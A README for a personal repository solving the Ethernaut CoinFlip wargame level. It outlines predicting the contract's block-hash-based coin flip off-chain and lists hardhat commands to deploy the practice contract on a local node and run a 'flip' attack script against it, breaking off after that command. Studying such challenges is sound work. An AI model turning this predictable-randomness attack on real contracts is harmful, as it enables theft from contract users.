# CoinFlip challenge

Solve [Eternaut CoinFlip Challenge](https://ethernaut.openzeppelin.com/level/3). The simplest solution is to deploy a contract with a function that calculates the expected coin flip using the same algorithm as the flip function and then calls CoinFlip contract with the expected result. There are several documented solutions online: [solution1](https://www.goodbytes.be/article/ethernaut-walkthrough-level-3-coin-flip) or [solution2](https://hackernoon.com/how-to-solve-the-level-3-of-the-ethernaut-game). But I wanted to hack CoinFlip directly off-chain without deploying any extra contract.

This works fine on local environment but not always easy to use on a public testnet as you are not 100% certain that your transactions will be included by the miners in the correct block.

Run `yarn` to install dependencies.

## Hack `CoinFlip` locally

- Compile the contracts

  ```sh
  yarn compile
  ```

- Start a local blockchain network

  ```sh
  yarn start-node
  ```

- Deploy `CoinFlip` contract

  ```sh
  yarn deploy-coinflip
  ```

  ```sh
  yarn deploy-coinflip
  yarn run v1.22.19
  $ npx hardhat run scripts/deploy-coinFlip.ts
  CoinFlip address 0x5FbDB2315678afecb367f032d93F642f64180aa3
  ```

- Note the address
- Hack the contract by running the `flip` script

  ```sh
  yarn flip <your-address>
  ```

  ```sh
  yarn flip 0x5FbDB2315678afecb367f032d93F642f64180aa3
  yarn run v1.22.19
  $ npx hardhat flip --coinflip 0x5FbDB2315678afecb367f032d93F642f64180aa3
